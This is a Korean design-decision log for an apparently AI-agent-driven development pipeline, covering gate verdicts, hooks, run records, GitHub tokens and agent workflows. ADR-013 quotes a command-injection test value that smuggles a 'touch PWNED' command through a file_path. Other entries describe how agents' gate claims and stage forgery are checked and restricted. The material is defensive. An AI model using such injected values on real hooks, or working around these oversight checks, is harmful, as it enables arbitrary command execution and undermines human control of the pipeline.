- 다만 **건너뛰기 방지의 성격은 후퇴했다**(ADR-006): 메인 세션을 구조적으로 잠그는 수단이 없으므로, "workflow를 호출하지 않고 스테이지를 위조"하는 시도는 **금지가 아니라 탐지**로 막힌다. 유일한 방어선은 `verify-stage.sh`의 사후 검증(+ADR-001의 훅 기록)이며, 이는 §4.2.2가 원래 요구하던 것과 동일하다 — 설계는 바뀌지 않고 "보너스로 기대했던 불가능성"만 사라졌다.
- 런타임에 Workflow 호출이 실패하면 §4.2.4의 규칙대로 `blocked` + `orchestration-unavailable`로 끝난다. **자동 모드 전환은 여전히 없다.**

---

## ADR-010 게이트 판정은 파일이 진실 (handoff 복사본 불일치 거부) — 2026-09-12

**질문**: `gates.sh`(L1, 에이전트 프로세스 밖)가 쓰는 `.factory/out/gates.json`과 workflow가 handoff에 스스로 채워 넣는 `gates` 필드가 다르면 어느 쪽을 믿는가.

**관측** (Plan 1b `lib/verify-stage.js`·`lib/requirements.js`·`lib/gates.js` 구현, Task 12): `verify-stage.js`는 handoff의 `data.gates`가 이미 채워져 있고 파일 값과 다르면 `"handoff gates mismatch: ..."`로 스테이지를 거부한다. 빠져 있으면(워크플로가 아예 안 실었으면) 파일 값(`{status, level}`)으로 채워 넣는다 — 스키마 검증은 이 채움 **뒤에** 이뤄지도록 순서를 바꿨다(워크플로가 `gates`를 빠뜨려도 파일 값으로 `implement.v1`을 만족할 수 있어야 하므로). `requirements.js`의 `factory:awaiting-review` 규칙도 `ctx.gatesFile`이 있으면 handoff의 자기 신고 대신 **파일의 status**를 본다: "게이트 판정의 출처는 handoff가 아니라 러너가 쓴 파일이다 — 파일이 있으면 handoff의 자기 신고는 무시한다"(코드 주석 원문).

**결정**: 게이트 판정의 유일한 진실은 러너가 `gates.sh`로 만든 `.factory/out/gates.json`이다. handoff에 실리는 `gates` 필드는 그 파일의 **복사본** 취급이며, 워크플로가 스스로 다른 값을 써 넣으면(불일치) verify가 거부하고, 아예 누락하면(빈 값) verify가 파일 값으로 덮어쓴다. 에이전트 출력에 "GREEN"이라 적혀 있어도 판정은 파일만 본다 — §4.2.5의 원 원칙("에이전트는 gates를 돌릴 수는 있지만 판정할 수 없다")을 "파일 vs handoff 불일치"라는 구체적 실패 모드로 확장한 것이다.

**영향**: §3.3(approved/merged 요구사항 — ADR-012와 함께), §4.2.1 step 5·6, §6.2.

---

## ADR-011 flaky 귀책 재분류는 implement에서만; review·merge는 RED — 2026-09-12

**질문**: 기존 테스트가 RED일 때, "이 PR 탓인가 아니면 main에서도 flaky인가"를 재분류(`classify-failure.sh`)할 권한을 어느 스테이지가 갖는가. 모든 스테이지가 재분류하면 같은 테스트가 스테이지마다 다르게 판정될 수 있다.

**관측** (Plan 1b `lib/gates.js` `runStageGates`, Task 12): 실패 분류 호출(`classifyFailures`)은 `stage === "implement"` 조건 블록 안에서만 일어난다 — review·merge 스테이지에서 `runStageGates`를 호출해도 이 블록을 타지 않으므로 실패한 기존 테스트는 재분류 없이 그대로 RED로 집계된다. 소스 주석 원문: "분류(classifyFailures)는 **implement에서만** 한다. review/merge는 재분류 없이 RED가 RED다."

**결정**: flaky-existing 판정과 그에 따른 `factory:flaky` 이슈 자동 생성·판정 제외는 **implement 스테이지에서만** 일어난다. review·merge 단계에서 같은 테스트가 다시 실패하면(main이 그 사이 움직였거나 새 PR이 경쟁 조건을 심었거나) 재시도로 되돌리지 않고 RED로 판정해 사람 또는 다음 implement 재진입이 보게 한다. §5.2.5 도입부의 "gates.sh는 절대 재시도로 GREEN을 만들지 않는다"는 원칙을 "재분류 창구는 하나뿐"이라는 스테이지 경계로 구체화한 결정이다 — 재분류 권한이 여러 곳에 있으면 서로 다른 근거로 같은 테스트를 다르게 판정하는 상황을 막을 수 없다.

**영향**: §5.2.5-③, §4.2.1 step 5, §5.2.4.

---

## ADR-012 게이트 판정과 사전 assert의 분리 — `gatesChecked` — 2026-09-12

**질문**: "`gates.json`이 없다"(아직 검증 안 됨)와 "`gates.json`이 RED다"(검증했더니 실패)를 같은 검사로 뭉뚱그려도 되는가 — 특히 스테이지 **시작** 시점의 선행 handoff 확인(`assert-handoff.sh`)에도 그 검사를 걸면 무슨 일이 생기는가.

**관측** (Plan 1b `lib/requirements.js`, Task 12 리뷰 수정 "C-A"): `requirements.js`의 `gatesGate(ctx)`를 처음에는 `ctx.gatesFile`의 유무·status만으로 무조건 판정하게 만들었다. 그런데 `merge` 스테이지의 `assertHandoff`(stage=merge)는 **선행** handoff(review)를 확인하려고 `requirementFor("factory:approved")({issue, comments})`를 호출한다 — 이 시점은 `resetGates`가 지난 런의 `gates.json`을 이미 지운 직후라 `ctx.gatesFile`이 없다. 그 결과 매번 `"gates file missing"`으로 거부되어 **merge 스테이지 전체가 항상 실패**하는 회귀가 발생했다("merge: 선행 handoff 확인은 게이트를 요구하지 않는다" 테스트로 재현·확인, 785327b 리뷰).

**결정**: `gatesGate`는 **`ctx.gatesChecked === true`일 때만** 판정하고, 아니면 `null`(통과)을 돌려준다. 이 표식은 오직 **전이 경로**(`bin/run-stage.js`의 `transition` dep)에서만 `gates.json`과 함께 세워진다 — `runStage`의 `assertHandoff` dep과 `bin/assert-handoff.js`는 이 값을 절대 세우지 않는다(양쪽 코드에 그 이유를 주석으로 명시). 즉 "직전 스테이지가 산출물을 남겼는가"(assert, 스테이지 시작)와 "이번 스테이지의 게이트가 GREEN인가"(전이, 스테이지 종료)는 서로 다른 질문이고 서로 다른 코드 경로에서 검사된다. 부수 방어선: `gatesGate`는 `ctx.gatesFile?.diagnostic === true`(로컬 진단 CLI `bin/gates.js`의 산출물)도 거부한다 — 진단 실행이 전이를 통과시키지 못하게.

**영향**: §3.3(approved/merged 행의 전제 — ADR-010과 함께), §4.2.1 step 2·8.

---

## ADR-013 훅 입력 불신 원칙 (lint-touched 인젝션 사례) — 2026-09-12

**질문**: `PostToolUse` 훅이 에이전트가 채운 `tool_input`(예: `file_path`)을 셸 명령 문자열에 그대로 이어붙여도 되는가.

**관측** (Plan 1b `factory/hooks/lint-touched.sh`, Task 13 리뷰 CRITICAL 1): 최초 구현은 `cmd=${cmd//\{file\}/$file}`로 `tool_input.file_path`를 이스케이프 없이 명령 템플릿에 그대로 치환했다. review가 `file_path: "x.js; touch <tmp>/PWNED #"`를 채운 Edit/Write 호출을 흉내 낸 테스트로 이 경로를 재현했다 — 수정 전 코드는 `;` 뒤를 별도 명령으로 실행해 `PWNED` 파일이 실제로 생성됐다(`existsSync(pwnDir/PWNED) === true`, 인젝션 성공을 그대로 증명). 훅은 에이전트 프로세스 **밖**에서 도는 L2 강제 장치인데, 그 장치 자신이 에이전트가 통제하는 문자열로 임의 명령을 실행할 수 있는 구멍이 있었던 것이다.

**결정**: **훅에 들어오는 `tool_input` 값은 신뢰하지 않는다 — 셸 문자열에 끼워 넣을 때는 반드시 이스케이프한다.** `lint-touched.sh`는 `file_path`를 `printf '%q'`로 이스케이프한 뒤에만 명령 템플릿의 `{file}` 자리에 넣는다(`qfile=$(printf '%q' "$file"); cmd=${cmd//\{file\}/$qfile}`). 재현 테스트(`lint-touched: shell-escapes file_path — no command injection via Edit/Write`)로 수정 후에는 `PWNED`가 생성되지 않음을 확인했다. 이 원칙은 `lint-touched.sh` 하나에 국한되지 않는다 — 앞으로 어떤 훅이든 `tool_input`(또는 다른 에이전트 통제 필드)을 `bash -lc`류 문자열에 섞으면 같은 방식으로 이스케이프해야 한다.

**영향**: §6.3(`lint-touched.sh` 서술). 이 이스케이프 규칙은 ADR-009의 "로깅 훅은 항상 exit 0" 규칙과 나란히 적용되는 별개의 규칙이다 — 하나는 훅이 잡을 막지 않게 하고, 하나는 훅 자신이 인젝션 구멍이 되지 않게 한다.

---

## ADR-014 run 기록은 `factory/records` 브랜치 — 보호된 default 브랜치에는 직접 push할 수 없다 — 2026-09-12

**질문**: `run-stage.sh`의 마지막 단계(§4.2.1 step 9)는 `docs/factory/runs/<issue>.md`를 매 스테이지 append하고 커밋·push해야 한다(§9). 이 파일은 어느 브랜치에 올라가야 하는가 — 러너가 review·merge 스테이지에서는 detach된 HEAD(ADR-008 이전, Task 12)로 도는데, 그 detached HEAD에서 만든 커밋은 애초에 어떤 브랜치에도 속하지 않는다.

**관측** (Plan 2 Task 14): required status checks(`factory/gates`, `factory/review` — Task 11)가 걸린 default 브랜치는 러너가 직접 `git push origin <sha>:refs/heads/main` 같은 방식으로 밀어 넣을 수 없다(브랜치 보호 규칙이 거부한다) — PR을 거치지 않는 한 어떤 커밋도 그 브랜치에 직접 올라갈 수 없다. 게다가 run 기록은 스테이지마다(개별 이슈의 triage/plan/implement/review×N/merge) append되므로, 커밋할 때마다 PR을 새로 열 수도 없다. 한편 review·merge 스테이지는 PR head를 검증하려고 로컬 HEAD를 detach해서 고정한다(ADR 미기재, Task 12 R6) — 그 상태에서 "현재 브랜치"에 커밋하는 방식(`git add && git commit`)은 애초에 성립하지 않는다(현재 브랜치가 없다). 즉 필요한 것은 **현재 체크아웃·인덱스·HEAD를 전혀 건드리지 않고**, 별도 브랜치의 끝에 커밋 하나를 이어 붙이는 방법이다.

**결정**: run 기록은 default 브랜치가 아니라 전용 `factory/records` 브랜치에, git plumbing만으로 append한다(`factory/lib/records-branch.js` `syncRecords`) — 워킹 트리·현재 인덱스·현재 브랜치(또는 detached HEAD)를 하나도 건드리지 않는다: `git fetch`로 원격의 현재 tip을 parent 후보로 얻고(브랜치가 아직 없으면 parent 없음), 임시 `GIT_INDEX_FILE`(`<git-dir>/factory-records.index`, 끝나면 삭제)에 parent tree를 `read-tree`한 뒤(없으면 `--empty`) `docs/factory/runs/*.md`를 `hash-object -w` + `update-index --add --cacheinfo`로 올리고, `write-tree` → `commit-tree <tree> -p <parent> -m <message>` → `git push origin <commit>:refs/heads/factory/records`로 민다. author/committer는 기본 `factory-bot <factory-bot@users.noreply.github.com>`(env로 override 가능). push가 non-fast-forward로 거부되면(동시에 도는 다른 러너가 먼저 밀었다) 처음부터 **한 번만** 재시도(`retried: true`) — 그래도 실패하면 `{ ok:false, reason }`을 돌려줄 뿐 절대 throw하지 않는다. 읽기는 대칭적으로 `readRecords`(`ls-tree -r` + `show`)가 `Map<issue, text>`를 돌려준다(브랜치 없으면 빈 Map). `bin/run-stage.js`의 `finally`는 `release` 뒤에 `syncRecords`를 자신만의 try/catch로 호출한다 — 실패해도(`ok:false`든 throw든) `console.error` + `record([...])`로 흔적만 남기고 **스테이지의 exit code는 절대 바꾸지 않는다**: run 기록 동기화는 부수 효과이지, 스테이지 성패의 일부가 아니다. plumbing이 브랜치·HEAD 상태에 전혀 의존하지 않는다는 것은 detached HEAD 클론에서 sync하는 테스트로 확인했다(review·merge의 실제 실행 조건과 동일).

**영향**: §4.2.1 step 9(run-record.sh → syncRecords), §9(run 기록의 저장 위치 — default 브랜치가 아니라 `factory/records`), `factory status`·retro가 run 기록을 읽는 경로(이제 로컬 파일이 아니라 `readRecords`로 이 브랜치를 봐야 한다 — 로컬 워크트리의 `docs/factory/runs/`는 러너 프로세스 안에서만 유효하고 다음 런에서 fresh checkout이면 사라진다).

**보강 (ADR-014, Plan 2 실행 판결)** — 2026-09-12 (fix round 2, F5·F6·F8로 문언 정정): 위 결정은 "쓰기"만 다뤘다. 실행 중 두 가지가 더 필요했다.

첫째, `bin/run-stage.js`는 **`charterReady`가 통과한 직후**(back-pressure·claim·`localEntry`보다도 먼저) `hydrateRecord`를 호출해 `factory/records` 브랜치의 `docs/factory/runs/<issue>.md`를 로컬 워크트리로 복원한다 — fresh checkout(또는 detached HEAD)에는 이전 스테이지가 쓴 run 기록이 없으므로, 하이드레이트 없이 append하면 이전 스테이지 줄이 사라진다. 하이드레이트가 이 자리인 이유는 back-pressure 거부와 claim 실패도 각자 `record()` 줄을 남기고 물러나기 때문이다 — 그보다 늦으면 그 줄들이 "한 줄짜리 새 파일"에 쓰인다. 락을 잡기 전이지만 안전하다: 이 호출은 로컬 기록 파일 하나만 만지고 원격에는 아무것도 쓰지 않는다.

둘째, `syncRecords`는 **어느 쪽 내용도 잃지 않는다**. 로컬 파일이 브랜치 tip 내용의 연장(접두어 포함)이면 그대로 올린다. 연장이 아니면(같은 이슈에서 동시에 돈 다른 러너가 그 사이 자기 섹션을 먼저 push했다 — 둘 다 같은 tip을 하이드레이트하고 서로 다른 꼬리를 붙인 경우) 로컬 파일 전체가 아니라 **공통 접두어 이후의 로컬 꼬리만 브랜치 tip 뒤에 이어 붙이고**(`merged: [path]`), 공통 접두어는 줄 경계까지만 인정하되 끝에 붙은 빈 줄은 꼬리에 돌려준다(그래야 이어 붙인 섹션이 `## <stage>` 헤더와 구분용 빈 줄을 온전히 유지한다). 아무것도 건드리지 않는 경우는 **더할 꼬리가 없을 때 하나뿐이다**(로컬이 브랜치보다 뒤처져 있을 뿐 — `skipped: [path]`). `run-stage`의 `finally`는 `ok:true`여도 `merged`/`skipped`가 있으면 run 기록 한 줄로 남긴다 — "내가 쓴 줄이 내가 기대한 자리에 있지 않다"는 사실은 사후 감사에서 보여야 한다.

두 조치 모두 "여러 러너가 같은 이슈의 run 기록에 순서 없이 동시 append할 수 있다"는 전제에서 나왔다 — 첫 결정 시점엔 그 경합까지 다루지 않았다.

**영향**: §9(run 기록 — 스테이지 시작 시 hydrate·꼬리 병합 append 명시), §4.2.1(step 0의 hydrate 위치).

---

## ADR-015 Plan 2 배선 판결 — 리뷰 트리거·단일 PAT·체크 상태·merge 스크립트 전용 — 2026-09-12

**질문**: Plan 2(CLI·템플릿·CI 배선)를 실행하려면 스펙이 확정하지 않은 GitHub 제약 여섯 가지에 답해야 했다 — review 잡을 무엇으로 깨울지, 토큰을 몇 개 발급할지, merge를 에이전트가 계속 개입시킬지, retro-proposal PR의 리뷰어 규칙을 branch protection으로 표현할 수 있는지, review·merge가 어떤 워킹 트리 상태에서 게이트를 돌릴지, `factory run triage`가 `backlog` 이슈를 어떻게 다룰지. 각각은 스펙 문언과 실제 GitHub 동작이 부딪히는 지점이었다.

**관측** (Plan 2 실행 중, 계획 문서 "Rulings baked into this plan" R1·R2·R3·R5·R6·R7 + Task 3·9·10·13·14·15·16 구현):

- **GitHub 규칙 3가지가 선택지를 좁혔다.** ① `GITHUB_TOKEN`(기본 액션 토큰)이 만든 라벨·push 이벤트는 다음 워크플로를 깨우지 않는다 — PAT가 아니면 스테이지 간 체이닝 자체가 끊긴다. ② branch protection의 required reviewer 규칙은 "이 라벨이 붙은 PR만" 조건부로 걸 수 없다 — 리뷰어 요구는 전체 PR에 걸리거나 아예 안 걸린다. ③ 게이트(`lint`/`unit`/…)는 워킹 트리에서 명령을 실행해 판정하므로, 그 워킹 트리가 실제로 무엇을 체크아웃하고 있는지가 판정의 의미를 결정한다.
- **R1** — `factory-review.yml`은 `pull_request: synchronize` 대신 `issues: labeled` (`factory:awaiting-review`)로 뜬다(`templates/factory/github/workflows/factory-review.yml`). implement가 이 라벨을 붙이는 순간이 "게이트 GREEN + PR 존재"가 확정된 시점이고, PR head는 이미 implement handoff의 `head_sha`로 묶여 있어 PR→이슈 매핑을 따로 계산할 필요가 없다.
- **R2** — 모든 스테이지가 단일 PAT `FACTORY_BOT_TOKEN`을 쓴다(checkout·`GH_TOKEN` 동일); merge 잡만 `${{ secrets.FACTORY_MERGE_TOKEN || secrets.FACTORY_BOT_TOKEN }}`로 선택적 상위 토큰을 허용한다(모든 yml 템플릿에서 확인). 위 GitHub 규칙 ①이 근거다 — `GITHUB_TOKEN`으로는 triage→plan→…→merge 체인이 끊긴다. 머지 보호는 이 토큰 하나가 아니라 L0(required checks)+L1(merge 스크립트 전용)+L2(deny)의 합으로 성립한다.
- **R3** — merge 스테이지는 `claude -p` 호출이 없다(`factory/bin/run-stage.js`: `stage === "merge"`이면 trust-workspace조차 건너뛴다 — "merge는 workspace를 신뢰 등록할 필요가 없다, claude -p를 전혀 부르지 않는다" 원문 주석). PR이 `CONFLICTING`이면 `factory:approved → factory:rework`로 전이하며 사유에 "merge conflict"를 남긴다(`factory/lib/merge-stage.js`, `factory/lib/labels.js`의 `approved → rework` 엣지). integrator 에이전트를 spawn하는 대신 implement 재진입이 conflict를 해소한다. `mergeable`이 `UNKNOWN`(GitHub이 아직 계산 중)이면 `prInfo`를 5초 후 한 번 재조회한다(`MERGEABILITY_REPOLL_MS = 5000`) — 그래도 `MERGEABLE`이 아니면(여전히 `UNKNOWN`이든 다른 값이든) `factory:needs-human`으로 전이하며 사유 "mergeability unknown after re-poll"을 남긴다(fail-closed — 무한정 기다리지 않는다).
- **R5** — retro-proposal PR의 "required reviewer 1명" 규칙은 branch protection에 넣지 않았다 — 위 GitHub 규칙 ②(라벨 조건부 불가)가 이유다. 대신 merge 스테이지가 `claude/fq-*` 브랜치 PR만 머지 대상으로 보므로(스크립트가 만들지 않은 PR은 애초에 자동 머지 후보가 아니다), retro가 만드는 `factory:retro-proposal` PR은 구조적으로 사람만 머지한다.
- **R6** — review·merge 스테이지는 게이트를 돌리기 전에 implement handoff의 `head_sha`로 PR head를 detach checkout한다(`makeCheckoutHead`, `factory/bin/run-stage.js`). 위 GitHub 규칙 ③이 근거다 — default 브랜치 워킹 트리에서 돈 GREEN은 그 PR에 대한 판정이 아니다. checkout 시점에 PR head가 handoff의 `head_sha`와 다르면(그 사이 새 커밋이 push됨) "PR head moved" 사유로 `needs-human`. detach된 HEAD 위에서 트리가 지저분해지는 것도 그 자체로 위험 신호라 `stop-guard.sh`가 브랜치 없이도(`git branch --show-current`가 빈 문자열이어도) `git status --porcelain`을 검사해 미커밋 변경이 있으면 종료를 거부한다 — review/merge는 애초에 트리를 건드리면 안 된다는 원칙이 브랜치 유무와 무관하게 적용된다.
- **R7** — `factory run triage <n>`을 라벨이 정확히 `backlog`인 이슈에 실행하면, `claim.sh`로 lock을 **먼저** 잡고(1단계) 그다음에야 `backlog → factory:queue` 전이 코멘트를 남긴다(`makeLocalEntry`, `factory/bin/run-stage.js` — claim 직후. `hydrateRecord`는 그보다 앞, `charterReady` 직후다 — ADR-014 보강). `FACTORY_LOCAL_ENTRY=1`이 없는 GitHub 이벤트발 triage 잡은 이 경로를 타지 않는다. 다른 스테이지는 라벨을 옮기지 않는다(전이는 오직 `assert-handoff`/`transition`이 처리); `factory run merge`는 CLI 자체가 존재하지 않는다(§2.1 `factory run` 스테이지 목록은 `triage|plan|implement|review`뿐).

**결정**: R1·R2·R3·R5·R6·R7을 위 관측대로 확정한다. 부수적으로, Plan 2 실행 중 스펙에 없던 판결 다섯 가지도 함께 확정한다(전부 코드·테스트로 검증됨):

1. **`.claude/settings.json`은 `init`에서도 결정적으로 병합된다** — `--upgrade`뿐 아니라(`factory/cli/install.js` `planInstall`: `merge === "settings"`인 항목은 `mode` 분기보다 먼저 병합 처리된다). 브라운필드 저장소는 이미 자기 `settings.json`을 가지고 있을 수 있으므로, "파일이 없으면 create, 있으면 무조건 skip"이라는 `init`의 일반 규칙(§2.1)이 이 파일에는 적용되지 않는다 — deny 합집합·훅 append는 init 시점에도 안전하게 가산적이다.
2. **라벨 그래프가 세 엣지를 더 가진다**: `factory:approved → factory:blocked`, `factory:awaiting-review → factory:blocked`(게이트·API 조회 실패로 두 스테이지 모두 `blocked`로 끝날 수 있어 양쪽 다 빠져나가야 한다), `factory:approved → factory:rework`(R3의 conflict 경로). 그리고 `transition()`이 그래프가 거부하는 엣지를 만나면 라벨은 바꾸지 않고 `factory-transition-refused` 코멘트만 남긴다(`factory/lib/transition.js`) — merge 경로를 포함해 전이가 조용히 실패하는 지점이 없다.
3. **라벨 카탈로그는 19개다** — `backlog`(1) + `factory:*` 상태(12) + 보조 라벨(6, tier 3종 + retro-proposal + flaky + harness). 스펙 §3.1 표의 "13 states"는 이 중 상태 라벨 12개에 `backlog`를 더한 숫자다(`factory/lib/label-catalog.js` 주석에 명시).
4. **`checksGreen`은 `harness.toml [factory].required_checks`에 열거된 이름 전부가 존재하고 전부 통과일 때만 true다**(`allChecksGreen`, `factory/lib/gh.js`) — 같은 이름이 중복 보고돼도 전부 통과라면 green이고, `required`가 빈 배열이면 무조건 false(fail-closed, "확인할 게 없다"를 통과로 읽지 않는다). `factory/gates`·`factory/review`는 run-stage가 PR head sha에 commit status로 게시하는 값이고(§4.2.1 step 5·8), `factory/integrity`는 `factory-integrity.yml`의 잡 `name:`(GitHub가 자동으로 만드는 체크 이름)이라 run-stage가 게시하지 않는다 — 셋의 "게시 주체"가 서로 다르다.
5. **run 기록은 스테이지 시작 시 하이드레이트되고, 동기화는 비파괴적이다** — ADR-014 보강 참조.
6. **doctor**: `verdict-format.sh`/`record-agents.sh` 검사는 실제 transcript 픽스처를 임시로 만들어 실행한다(fail-open을 실제로 확인하려면 파일이 있어야 한다); `roles.toml`에 정의된 모든 에이전트 경로를 CHARTER 로스터 소속 여부와 무관하게 검사한다(로스터 밖 역할도 파일이 실재해야 한다); CHARTER가 없거나 `status: draft`인 것은 FAIL이 아니라 WARN이다(§11 그린필드 흐름에서 `/project`가 CHARTER보다 먼저 doctor를 통과해야 하므로).
7. **`factory status`의 두 버킷**: "진행 중" = `factory:in-progress`/`awaiting-review`/`rework`/`blocked`(blocked 항목엔 "sweeper → needs-human" 힌트가 붙는다); "큐" = `factory:queue`/`ready`/`planned`/`approved`(`factory/lib/status.js` `LIVE_STATES`/`QUEUE_STATES`). 이슈별 사용량이 상위 10개까지 표시되지만, 사용량은 어떤 경우에도 진행을 막지 않고 보고만 한다(ADR-005 그대로).
8. **R8 — Plan 0 실측 버전 고정**: `actions/checkout`·`actions/setup-node`·`actions/upload-artifact` 전부 `@v4`(모든 `templates/factory/github/workflows/*.yml`에서 확인). 계획 문서의 R8을 그대로 채택했다 — 실측 근거는 Plan 0(ADR-009)에 있고 이 판결은 그 값을 Plan 2 템플릿에 고정했다는 사실만 추가한다.

**보강 — L0 required contexts** (fix round 2, F2·F3) — 2026-09-12: 위 4번 판결("`checksGreen`은 `required_checks` 전부")은 L1 얘기였는데, `bootstrap`이 그 목록을 그대로 branch protection의 `required_status_checks.contexts`로도 밀어 넣고 있었다. 그러면 default 브랜치가 교착한다 — `factory/gates`·`factory/review`는 **이슈 파이프라인을 탄 PR에만 게시자가 있다**(run-stage가 PR head sha에 commit status로 올린다). 사람이 여는 PR(retro가 만든 `factory:retro-proposal`, `factory:harness` 하네스 변경 — 둘 다 R5에 따라 구조적으로 사람만 머지한다)에는 그 상태를 만들 주체가 아예 없고, 부트스트랩 직후의 첫 push도 마찬가지다. 따라서 **L0의 contexts는 `["factory/integrity"]` 하나로 고정한다** — `factory-integrity.yml`은 모든 PR에서 뜨는 유일한 체크다. 게이트·리뷰가 느슨해지는 것이 아니다: 머지 스테이지가 `allChecksGreen(prChecks, harness.factory.required_checks)`로 세 개 전부를 계속 요구하고(L1), 스크립트가 만들지 않은 PR은 애초에 자동 머지 대상이 아니다. 함께 `required_status_checks.strict = false`로 둔다 — strict(=up-to-date required)는 머지 직전 base 리베이스를 요구하는데, 팩토리는 리베이스를 하지 않고(하면 게이트가 검증한 sha가 바뀐다) 게이트 판정은 이미 `requirements.js`의 `gatesGate`가 sha에 묶어두었다. 파생 결과로 그린필드 순서가 바뀐다(§11·`factory init`의 "Next"): `init / doctor → git push → bootstrap` — 보호 규칙을 먼저 걸면 그 첫 push 자신이 막힌다.

**보강 2 — required context가 하나뿐이라는 사실의 대가** (도그푸딩, ADR-020 KTB-5) — 2026-09-12: 위 보강이 L0 contexts를 `["factory/integrity"]` 하나로 고정한 순간, **그 체크가 RED로 만드는 모든 것이 사람의 머지까지 막는다**는 결과가 따라왔다(`enforce_admins: true`). 그런데 당시의 `integrity.js`는 보호 경로 변경을 위반으로 다뤄 exit 1 했고, 그래서 이 보강이 구하려던 바로 그 PR들(retro-proposal·`factory:harness`·인프라 업그레이드)이 여전히 머지 불가였다. ADR-020 KTB-5가 이것을 마감한다 — L0 체크는 **변조만** RED로 만들고, "보호 경로는 사람이 머지한다"는 집행은 L1(merge 스테이지가 자동 머지를 거부하고 `needs-human`으로 전이)로 옮겼다.

**영향**: §3.2(전이도에 세 엣지 추가), §3.3(그래프 거부가 코멘트를 남김), §4.1(review 트리거·merge "스크립트 전용"·retro "(Plan 4)"·액션 버전), §4.2.1(step 4 "merge는 호출 안 함"·step 9 "`factory/records` 브랜치"), §4.2.5(`factory run triage`의 backlog 경로), §5.1(`[factory].required_checks` 예시), §6.1(토큰·체크 게시 주체·retro-proposal 리뷰어 규칙 삭제), §6.3(settings.json 병합 시점·record-agents 훅), §13.4(`factory status` 버킷). 보강분: §6.1(L0 required contexts = `factory/integrity` 하나, strict=false), §11(그린필드 순서 `init / doctor → git push → bootstrap`).

---

## ADR-016 Plan 3 판결 — loader·리뷰 프로토콜 세부·must_fix id 규약·implement 수정 1회 — 2026-09-12

**질문**: Plan 3(Claude-side 배선 — 4개 workflow 스크립트, role 에이전트 14개, 리뷰 프로토콜)를 실제로 구현하려면 계획 문서의 P3-R1~R8이 각각 어떤 코드 모양으로 확정되는지 답해야 했고, 계획에 없던 세부 — loader의 실패 응답 모양, must_fix id가 리뷰어를 다시 찾아가는 방법, rework 완결성을 누가 세는지, `roles.toml`/`doctor`가 스펙 문언과 어긋난 지점을 어떻게 처리할지 — 도 구현 중에 결정해야 했다.

**관측** (Plan 3 실행 중, `templates/factory/claude/workflows/*.js`·`templates/factory/claude/agents/*.md`·`factory/lib/agent-md.js`·`factory/lib/doctor/factory.js`·`factory/lib/bootstrap.js`·`factory/test/*` 구현·TDD로 확정):

- **P3-R1 — loader**. `factory-loader`(sonnet, `tools: Read, Bash, Grep`)는 `roles.toml`의 어떤 `[stage.<name>]` 블록에도 속하지 않는다 — workflow의 첫 스텝일 뿐 로스터 역할이 아니라서다. `factory/lib/doctor/factory.js`의 `checkAgents`는 그래서 `roles.toml`이 가리키는 경로 목록에 `LOADER_AGENT = ".claude/agents/factory-loader.md"`를 별도로 추가해 lint한다(파일이 없으면 건너뛴다 — 부재는 `roles.agent-files`가 이미 잡는다). 네 workflow 전부(`factory-triage.js`/`factory-plan.js`/`factory-implement.js`/`factory-review.js`)가 **바이트 단위로 동일한 `LOADER` schema 리터럴**을 갖는다(`factory/test/workflows.test.js` "the four workflows share a byte-identical LOADER literal..."). schema에 `maturity: { type: 'string' }`가 추가돼 있다 — plan workflow의 `boundToMaturity`가 `done_when.level`을 하네스 성숙도로 묶는 데 쓴다. role 에이전트는 `context.json`을 스스로 읽지 않는다(workflow가 파일을 못 읽으므로 loader가 대신 읽어 schema로 넘긴다) — 다만 role 에이전트 **자신**은 자기 `.md`·`context.json`이 아니라 loader가 만들어 준 프롬프트 인자만 받는다(§4.2.3 그대로: role 에이전트가 직접 읽는 것은 자기 `.md`·lessons·diff이지 `context.json` 자체는 아니다 — loader가 이미 읽어 넘겼다). loader-null(두 번째도 null)과 issue-mismatch(`Number(loaded.issue) !== issue`)는 네 workflow 모두 동일한 모양 — `{issue, error, orchestration: 'workflow', guarantee: 'structural'}`, stage 필드(`disposition`/`done_when`/`verifier`/`verdicts` 등)를 아예 싣지 않는다 — 로 return한다. 각 스테이지의 schema(`triage.v1`/`plan.v1`/`implement.v1`/`review.v1`)는 그 필드들을 requires로 두므로 `verify-stage`가 그대로 실패시켜 needs-human으로 fail-closed된다. `once(fn)`는 null과 throw를 모두 "대답 없음"으로 묶어 정확히 1회만 재spawn한다 — 네 workflow가 동일한 `once` 구현을 공유한다(같은 파일 diff 테스트로 확인).
- **P3-R2 — implement**. `factory-implement.js`는 builder → verifier → (rejected일 때만) builder 수정 1회 → verifier 재판정 순서를 그대로 구현한다(`phase('Build')`→`phase('Verify')`→`phase('Fix')`). rework 완결성은 workflow가 센다: `reworkGaps(out)`이 `mustFix`(loader가 준 `handoffs.review` 합집합)의 모든 id가 `rework_response.responses[]`에 `fixed`(commit 필요) 또는 `disputed`(reason 필요)로 답변됐는지 확인하고, 빠지거나 형식이 틀린 id를 사람이 읽을 문자열로 모은다. 빠진 게 있으면 `completeRework`가 그 gap을 프롬프트에 박아 builder를 **1회만** 재spawn하고(`build:rework`/`fix:rework` label), 그래도 gap이 남으면 `reworkFailure`를 return한다 — 이 객체는 `verifier` 필드를 아예 갖지 않으므로 `implement.v1`(verifier required)이 검증에서 떨어져 needs-human이 된다. builder는 PR 본문·코멘트를 전부 `--body-file`로만 쓴다(`buildRules` 6번 — 인라인 `--body`/heredoc은 hook이 `>`로 시작하는 줄을 redirection으로 오독해 차단된다고 명시). 보호된 빌드-설정 경로(`PROTECTED` 상수 — `.factory/**`, `.claude/**`, `.github/workflows/factory-*.yml`, `CHARTER.md`, `package.json`, lockfile, `vitest.config.*` 등)는 builder 프롬프트에서 명시적으로 금지되고, 의존성 변경이 필요하면 PR 본문에 "Harness change needed"를 적고 사람이 `factory:harness` 이슈를 열게 한다(`npm install`·lockfile 수정·deny 우회 금지를 프롬프트에 명시). `Bash(gh pr edit*)`는 이미 존재하는 PR body를 갱신하는 경로로 buildRules 6번에 허용돼 있다(`gh pr edit <pr> --body-file <path>`).
